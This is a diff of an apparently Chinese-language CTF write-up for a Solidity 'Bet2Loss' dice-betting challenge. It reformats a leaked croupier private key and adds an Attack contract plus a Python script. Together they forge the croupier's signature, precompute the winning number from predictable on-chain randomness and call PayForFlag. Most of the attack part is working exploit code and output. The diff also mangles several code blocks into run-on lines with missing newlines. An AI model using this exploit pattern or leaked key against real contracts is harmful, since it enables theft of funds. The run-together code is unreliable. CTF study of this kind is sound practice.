@@ -15,7 +15,9 @@ STATEMENT
 
 croupier ⽤户账户和私钥泄露：
 
-address:0xACB7a6Dc0215cFE38e7e22e3F06121D2a1C42f6C privatekey:6F08D741943990742381E1223446553A63B38A3AA86BEEF1E9FC5FCF61E66D12
+address:
+0xACB7a6Dc0215cFE38e7e22e3F06121D2a1C42f6C privatekey:
+6F08D741943990742381E1223446553A63B38A3AA86BEEF1E9FC5FCF61E66D12
 
 分析过程
 
@@ -82,45 +84,17 @@ END
 
 
 ```
-address:0xACB7a6Dc0215cFE38e7e22e3F06121D2a1C42f6C privatekey:6F08D741943990742381E1223446553A63B38A3AA86BEEF1E9FC5FCF61E66D12
-```
-
-
-
-```
+address:
+0xACB7a6Dc0215cFE38e7e22e3F06121D2a1C42f6C privatekey:
+6F08D741943990742381E1223446553A63B38A3AA86BEEF1E9FC5FCF61E66D12
 require (msg.sender != croupier, "croupier cannot bet with himself."); require (isContract(msg.sender)==false, "Only bet with real people.");
-```
-
-
-
-```
 bytes32 entropy = keccak256(abi.encodePacked(reveal, placeBlockNumber)); uint dice = uint(entropy) % modulo; if (dice == betnumber){ diceWin = diceWinAmount; } # 得到 betnumber betnumber = uint(keccak256(abi.encodePacked(reveal, placeBlockNumber))) % modulo;require (modulo > 1 && modulo <= MAX_MODULO, "modulo should be within range."); # 1
 require (wager >= MIN_BET && wager <= MAX_BET, "wager should be within range."); require (wager != 0, "Bet should be in an 'active' state"); # 1<=wager<=1000 //取最⼤值计算 getDiceWinAmount(wager, modulo) 得到最⼤的转 账数量
-```
-
-
-
-```
 require (block.number <= commitLastBlock, "Commit has expired."); # commitLastBlock = block.number or block.number + x [1
-```
-
-
-
-```
 uint commit = uint(keccak256(abi.encodePacked(reveal))); Bet storage bet = bets[commit]; #得到 commit commit = uint(keccak256(abi.encodePacked(reveal))); [reveal 可以是⼀个随机值]
-```
-
-
-
-```
 pragma solidity ^0.4.23;interface Bet2Loss{ function placeBet(uint8, uint8, uint40, uint40, uint, bytes32,bytes32, uint8) external; function PayForFlag() external;}contract Attack{ uint8 public betnumber; uint8 public modulo = 100; //1<modulo<=100 //取最⼤值计算getDiceWinAmount(wager, modulo) 得到最⼤的转账数量 uint40 public wager = 1000; //取最⼤值计算 getDiceWinAmount(wager,modulo) 得到最⼤的转账数量 uint public commit; uint public reveal = 10010; //随机数 address public target = 0x724517A39a5B87F7DBc3C5cD2a783Fb20b59Ab1c;
  constructor(uint40 commitLastBlock, bytes32 r, bytes32 s, uint8 v)public{ betnumber = uint8(uint(keccak256(abi.encodePacked(reveal,uint40(block.number)))) % uint(modulo)); commit = uint(keccak256(abi.encodePacked(reveal)));
  Bet2Loss(target).placeBet(betnumber, modulo, wager,commitLastBlock, commit, r, s, v); } function get_flag() public{ Bet2Loss(target).PayForFlag(); }}
-```
-
-
-
-```
 from eth_abi import packedcroupier = '0xACB7a6Dc0215cFE38e7e22e3F06121D2a1C42f6C'private_key ='0x6F08D741943990742381E1223446553A63B38A3AA86BEEF1E9FC5FCF61E66D12'reveal = 10010modula = 100commitLastBlock = w3.eth.block_number + 250 # uint40print('commitLastBlock', commitLastBlock)'''# soliditycommit = uint(keccak256(abi.encodePacked(reveal))) #uintbytes32 signatureHash = keccak256(abi.encodePacked(commitLastBlock,commit))require (croupier == ecrecover(signatureHash, v, r, s)'''commit = packed.encode_abi_packed(['uint256'],[reveal]).hex()commit = int.from_bytes(w3.sha3(hexstr=commit),'big')Hash = '0x' + packed.encode_abi_packed(['uint40','uint256'],[commitLastBlock,commit]).hex()signatureHash = w3.sha3(hexstr=Hash).hex()result = w3.eth.account.signHash(signatureHash, private_key=private_key)print('r:',hex(result['r']))print('s:',hex(result['s']))print('v:',result['v'])'''commitLastBlock 263r: 0x191141135315c35103422b8302add3145a73793c2a9c8ee4866b600d4f4e819bs: 0x32c23629c9172382175602e028fabe5ddfa3341a3c1fe3f082f482a3aeec69f1v: 28'''
 ```
 
